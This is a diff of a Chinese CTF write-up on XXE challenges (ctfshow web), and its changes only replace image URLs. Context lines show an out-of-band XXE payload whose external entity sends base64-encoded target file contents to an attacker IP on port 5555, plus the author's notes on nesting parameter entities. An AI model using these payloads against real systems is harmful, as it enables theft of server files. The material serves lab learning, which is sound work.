@@ -98,7 +98,7 @@ xml
 
 服务端给了这样的回显,说明是没有使用php协议,当成了路径,仔细一想,应该使用另一个实体来替换后面的伪协议内容
 
-![image-20220110180025568](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220110180025568.png)
+![image-20220110180025568](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220110180025568.png)
 
  更改后的dtd文档
 
@@ -110,11 +110,11 @@ xml
 
 这次服务端回显了200,说明有成功请求到dtd文档,但是忘了一个问题,这里的file变量需要读取的内容在靶机上,而我这样写就是读取攻击机的内容了......
 
-![image-20220110180342295](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220110180342295.png)
+![image-20220110180342295](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220110180342295.png)
 
 查看了别人写的payload,明白了基本原理:利用xml的变量机制,把请求路径转换成通过base64编码的文件内容,所以得到的返回值是404
 
-![image-20220110182024289](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220110182024289.png)
+![image-20220110182024289](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220110182024289.png)
 
 ##### payload
 
@@ -149,23 +149,23 @@ dtd
 `<!ENTITY % xxe  SYSTEM "http://121.40.113.226:5555/%file;"> 
 %xxe;`
 
-但是如果写成这样,请求的路径就还是dtd文档了![image-20220110183234994](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220110183234994.png)
+但是如果写成这样,请求的路径就还是dtd文档了![image-20220110183234994](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220110183234994.png)
 
 在尝试中一个偶然的错误让我有了启发,----我忘记给dtd中的url加端口了
 
-![image-20220110183404676](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220110183404676.png)
+![image-20220110183404676](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220110183404676.png)
 
-![image-20220110183422805](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220110183422805.png)
+![image-20220110183422805](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220110183422805.png)
 
 此时的请求路径还是dtd文档,那也就是说,之前所有请求文档的都是因为%aaa和dtd文档的错误书写
 
-![image-20220110183448490](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220110183448490.png)
+![image-20220110183448490](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220110183448490.png)
 
 在dtd中如果颠倒%dtd和%xxe的顺序,请求路径还是dtd文档
 
 突然看到用payload的时候请求信息是两条,
 
-![image-20220110185118318](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220110185118318.png)
+![image-20220110185118318](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220110185118318.png)
 
 然后将dtd文档改成
 
@@ -174,7 +174,7 @@ dtd
 
 请求路径还是两条
 
-![image-20220110185242294](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220110185242294.png)
+![image-20220110185242294](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220110185242294.png)
 
 这个时候突然恍然大悟,为什么要用外部实体包裹它呢,是因为单个实体无法使用%file对路径进行替换,<laber style="color:red">真正发请求的还是%xxe</label>,用%dtd包裹它就可以使用%file对其进行替换,所以是先执行%dtd再执行%xxe
 
@@ -262,7 +262,7 @@ requests.post(url=url,data=payload.encode("utf-16"))
 
 这个是用burp抓的python发的包
 
-![image-20220110205856482](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220110205856482.png)
+![image-20220110205856482](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220110205856482.png)
 
 ### ctfshow web 378
 
@@ -279,5 +279,5 @@ requests.post(url=url,data=payload.encode("utf-16"))
 
 这道题的payload很简单,但是起初我一直抓不到发给dologin的数据包,这是为何????,但是后面又抓到了.....
 
-![image-20220110205445709](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220110205445709.png)
+![image-20220110205445709](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220110205445709.png)
 
